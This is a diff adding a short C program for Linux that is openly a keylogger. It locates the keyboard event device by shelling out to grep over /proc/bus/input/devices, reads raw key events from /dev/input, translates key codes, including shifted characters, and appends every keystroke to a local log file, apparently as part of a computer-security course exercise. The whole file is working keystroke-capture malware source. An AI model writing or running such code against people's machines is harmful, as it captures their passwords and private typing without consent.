@@ -1,0 +1,94 @@
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <linux/input.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+
+#define LOGFILEPATH "/home/ricardo/seguridad_informatica/programas/keylogger.txt"
+
+char *getEvent();
+char mapKeyCodeToChar(int code, int shiftPressed);
+
+int main() {
+    struct input_event ev;
+    static char path_keyboard[20] = "/dev/input/";
+    strcat(path_keyboard, getEvent());
+    path_keyboard[strlen(path_keyboard) - 1] = 0;
+
+    errno = 0;
+    int device_keyboard = open(path_keyboard, O_RDONLY);
+    if (device_keyboard < 0) {
+        printf("Error: %d\n", errno);
+        return 1;
+    }
+
+    FILE *fp = fopen(LOGFILEPATH, "a");
+    if (!fp) {
+        printf("Error al abrir el archivo de log: %s\n", strerror(errno));
+        close(device_keyboard);
+        return 1;
+    }
+
+    int shiftPressed = 0;
+
+    while (1) {
+        read(device_keyboard, &ev, sizeof(ev));
+        if (ev.type == EV_KEY) {
+            if (ev.value == 1 || ev.value == 0) { 
+                if (ev.code == 42 || ev.code == 54) {  
+                    shiftPressed = ev.value;
+                } else if (ev.value == 0) { 
+                    char c = mapKeyCodeToChar(ev.code, shiftPressed);
+                    if (c) {
+                        fputc(c, fp);
+                        fflush(fp);
+                    }
+                }
+            }
+        }
+    }
+
+    fclose(fp);
+    close(device_keyboard);
+    return 0;
+}
+
+char *getEvent() {
+    char *command = (char *)"cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
+    static char event[8];
+    FILE *pipe = popen(command, "r");
+    if (!pipe)
+        exit(1);
+    fgets(event, 8, pipe);
+    pclose(pipe);
+    return event;
+}
+
+char mapKeyCodeToChar(int code, int shiftPressed) {
+    // Mapas de códigos de teclas a caracteres
+    static const char keyMapNormal[] = {
+        0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0, 0, // 0-15
+        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', 0, 'a', 's', // 16-31
+        'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0, '\\', 'z', 'x', 'c', 'v', // 32-47
+        'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' ', // 48-57
+        
+    };
+
+    static const char keyMapShifted[] = {
+        0, 0, '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', 0, 0, // 0-15
+        'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '{', '}', '\n', 0, 'A', 'S', // 16-31
+        'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '"', '~', 0, '|', 'Z', 'X', 'C', 'V', // 32-47
+        'B', 'N', 'M', '<', '>', '?', 0, '*', 0, ' ', // 48-57
+      
+    };
+
+    if (code < sizeof(keyMapNormal)) {
+        return shiftPressed ? keyMapShifted[code] : keyMapNormal[code];
+    }
+
+    return 0;
+}
+
